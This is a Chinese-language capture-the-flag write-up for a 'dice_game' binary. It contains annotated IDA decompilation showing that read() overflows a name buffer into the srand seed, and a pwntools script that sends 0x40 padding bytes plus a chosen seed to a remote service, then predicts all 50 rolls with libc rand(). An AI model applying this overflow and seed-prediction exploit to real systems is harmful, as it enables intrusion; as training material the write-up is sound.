Dice_game-writeup

放进ida反编译：

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char buf[55]; // [rsp+0h] [rbp-50h]
  char v5; // [rsp+37h] [rbp-19h]
  ssize_t v6; // [rsp+38h] [rbp-18h]
  unsigned int seed[2]; // [rsp+40h] [rbp-10h]  #seed[0]距离buf 0x40
  unsigned int v8; // [rsp+4Ch] [rbp-4h]

  memset(buf, 0, 0x30uLL);
  *(_QWORD *)seed = time(0LL);
  printf("Welcome, let me know your name: ", a2);
  fflush(stdout);
  v6 = read(0, buf, 0x50uLL);                  #read可以读入0x50个字符，可以覆盖到seed
  if ( v6 <= 49 )															 #有参数的read函数返回读入的字符数量
    buf[v6 - 1] = 0;                           #读的字符数量>49个酒不会触发这一行
  printf("Hi, %s. Let's play a game.\n", buf);
  fflush(stdout);
  srand(seed[0]);															 #c语言中rand函数只要有seed，之后随机的数字是可预见的
  v8 = 1;
  v5 = 0;
  while ( 1 )
  {
    printf("Game %d/50\n", v8);
    v5 = sub_A20();
    fflush(stdout);
    if ( v5 != 1 )
      break;
    if ( v8 == 50 )
    {
      sub_B28(buf);
      break;
    }
    ++v8;
  }
  puts("Bye bye!");
  return 0LL;
}
```

要把rand的seed设成我们知道的量，这样我们就能知道之后50个随机的数字是什么

rand()函数在lib文件中，所以我们只要用给的lib文件里的rand函数，先设好seed，然后得到之后随机的50个数，返回给服务器即可

```python
from pwn import *
from ctypes import * 

context.log_level='debug'
libc = cdll.LoadLibrary("libc.so.6")
#p = process('./dice_game')
 
p = remote("111.198.29.45",36187)
p.recvuntil(" let me know your name: ")
p.send("A" * 0x40 + p64(1))

libc.srand(1)
for i in range(50): 
  p.recvuntil("Give me the point(1~6): ")
  p.send(str(libc.rand()%6 + 1) + "\n")
 
p.interactive()
```

python用法：

`libc = cdll.LoadLibrary("libc.so.6")`

`libc.srand(1)`

`libc.rand()`



p.s.

理论上如果本地的libc是一样的话

可以自己用c写一个rand函数得到答案（但是没有用上面的方法保险）

